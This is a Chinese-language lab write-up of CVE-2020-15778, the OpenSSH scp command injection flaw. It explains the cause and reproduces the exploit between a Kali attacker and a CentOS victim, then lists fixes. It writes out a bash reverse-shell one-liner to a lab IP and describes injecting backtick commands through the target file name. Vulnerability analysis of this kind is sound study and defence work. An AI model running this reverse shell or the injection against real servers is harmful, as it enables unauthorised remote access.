## 漏洞说明

漏洞编号：CVE-2020-15778

SCP(secure
copy)是一个在两台计算机之间拷贝文件的程序，使用ssh协议实现。默认包含在大多数的linux和unix发行版中。该程序由openssh的scp.c及其他相关代码实现。

出现漏洞的根本原因在于，scp.c文件的某个位置中，对远程命令参数没有做好过滤，导致可远程执行任意命令。详细分析，往下看。

## 利用条件

1\. 目标服务器openssh版本<=openssh-8.3 p1

2\. 目标服务器scp可用

3\. 目标服务器ssh密码已知

## 漏洞危害

可在目标服务器上传脚本，执行任意命令，getshell。

## 利用场景

在已知ssh密码，但禁止ssh远程登陆的情况下，可尝试利用该漏洞，getshell。

## 漏洞分析

分析如下链接中，scp.c的第989行代码：

<https://github.com/openssh/openssh-portable/blob/a2855c048b3f4b17d8787bd3f24232ec0cd79abe/scp.c#L989>

![1609939398_5ff5b9c6b8eeb18b8d80a.png!small](https://image.3001.net/images/20210106/1609939398_5ff5b9c6b8eeb18b8d80a.png!small)

从以上代码中可知，当使用scp复制文件到远程服务器时，在scp命令后面添加文件的路径，命令如下：

    
    
    scp SourceFile user@host:directory/TargetFile

在远程目标服务器上，上述命令将会按照下面的形式本地执行：

    
    
    scp -t directory/TargetFile

在目标服务器创建本地scp命令的同时，并没有过滤文件名。攻击者可以使用反引号包裹payload然后加上文件名执行scp命令。目标服务器将会执行反引号中的命令。

## 漏洞复现

攻击机 | kali| 192.168.110.128  
---|---|---  
受害机| centos| 192.168.110.130  
  
在kali上创建一个名为kali.sh的文件，用来getshell。kali.sh文件内容：

    
    
    bash -i >& /dev/tcp/192.168.110.128/4444 0>&1

![1609921634_5ff574623c473318c51e4.png!small](https://image.3001.net/images/20210106/1609921634_5ff574623c473318c51e4.png!small)

反弹shell命令解析如下：

 **命令**|  **说明**  
---|---  
bash -i| 产生一个交互式bash  
>& /dev/tcp/192.168.110.128/4444| 建立TCP连接，并将标准输出和错误重定向到TCP连接  
0>&1| 从TCP连接获取输入  
  
  

将kali.sh文件通过scp命令，远程传输到centos中的指定目录下：

![1609922140_5ff5765c6046de0068ae3.png!small](https://image.3001.net/images/20210106/1609922140_5ff5765c6046de0068ae3.png!small)

在centos中可找到传输的kali.sh文件：

![1609921744_5ff574d0d09c73861d392.png!small](https://image.3001.net/images/20210106/1609921744_5ff574d0d09c73861d392.png!small)

在kali上监听4444端口：

![1609922311_5ff57707e1ed6ba01fde9.png!small](https://image.3001.net/images/20210106/1609922311_5ff57707e1ed6ba01fde9.png!small)

执行下面的poc，执行上传的反弹shell：

![1609922354_5ff57732cf66256e94737.png!small](https://image.3001.net/images/20210106/1609922354_5ff57732cf66256e94737.png!small)

可观察到，kali已经成功连接到centos：

![1609922436_5ff5778437277fffb575c.png!small](https://image.3001.net/images/20210106/1609922436_5ff5778437277fffb575c.png!small)

在linux中，反引号中的内容将会被当作shell命令执行。要注意，这里poc中用的是反引号，不是单引号。

## 漏洞修复

1\. 更新openssh到最新版本

2\. 禁用scp

3\. 确保ssh密码的安全性，防止被泄露或暴力破解

